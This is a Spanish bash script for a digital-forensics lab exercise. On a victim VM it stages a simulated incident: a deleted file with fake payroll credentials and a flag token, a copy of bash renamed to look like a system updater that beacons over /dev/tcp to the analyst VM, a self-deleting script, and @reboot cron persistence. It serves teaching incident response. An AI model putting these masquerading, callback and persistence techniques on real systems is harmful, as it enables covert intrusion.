#!/bin/bash
# Simula un incidente INOFENSIVO en la VM victima (solo laboratorio).
# Lo que hace: (1) copia bash con nombre falso y lo deja ejecutando un "beacon" TCP hacia la VM
# analista, (2) borra el script mientras el proceso sigue vivo, (3) deja una entrada en cron y
# (4) escribe y borra archivos en el disco EVIDENCIA. No cifra, no exfiltra, no toca nada mas.
# Uso:  sudo ./simular_incidente.sh Pnn <IP_ANALISTA> [puerto]
# Deshacer: sudo ./limpiar_lab.sh
set -euo pipefail
[ "$(id -u)" -eq 0 ] || { echo "Ejecute como root (sudo)."; exit 1; }
[[ "${1:-}" =~ ^P[0-9]{2}$ ]] || { echo "Uso: $0 Pnn IP_ANALISTA [puerto]"; exit 1; }
PAREJA="$1"; IP="${2:?Falta la IP del analista}"; PUERTO="${3:-4444}"

# Marca unica por pareja: el docente la recalcula con el mismo SHA-256 para validar el hallazgo.
HEX=$(printf '%s' "Forense-2026-2:${PAREJA}" | sha256sum | cut -c1-12)
TOKEN="FLAG{${HEX}}"

mountpoint -q /mnt/evidencia || mount -L EVIDENCIA /mnt/evidencia

# --- Archivos en EVIDENCIA (uno se borra) ---
D=/mnt/evidencia/Proyectos
mkdir -p "$D"
for i in 1 2 3 4 5; do
    printf 'Documento interno %s - Pareja %s\nContenido de trabajo rutinario.\n' "$i" "$PAREJA" > "$D/informe_$i.txt"
done
{
    printf 'usuario: admin_nomina\nclave: Temporal#2026\nmarca: %s-ELIMINADO\n' "$TOKEN"
    for _ in $(seq 1 200); do printf 'Respaldo de claves del servidor de nominas. '; done
    printf '\n'
} > "$D/respaldo_credenciales.txt"
sync
rm -f "$D/respaldo_credenciales.txt"
sync

# --- "Implante": bash renombrado + script que se borra con el proceso vivo ---
BIN=/usr/local/lib/systemd-update
SCR=/usr/local/lib/.update.sh
cp /bin/bash "$BIN"
cat > "$SCR" <<EOF
SECRET='${TOKEN}'
while true; do
    if exec 3<>/dev/tcp/${IP}/${PUERTO}; then
        while echo "BEACON \$(hostname) \$(date -u +%FT%TZ)" >&3; do sleep 10; done
        exec 3>&-
    fi
    sleep 10
done
EOF
nohup setsid "$BIN" "$SCR" >/dev/null 2>&1 &
sleep 3
rm -f "$SCR"

# --- Persistencia simulada ---
printf '@reboot root /usr/local/lib/systemd-update /usr/local/lib/.update.sh\n' > /etc/cron.d/systemd-update

echo "Incidente simulado iniciado: $(date -u +%FT%TZ) UTC"
echo "Ahora usted es el primer respondiente. No reinicie ni apague la VM."
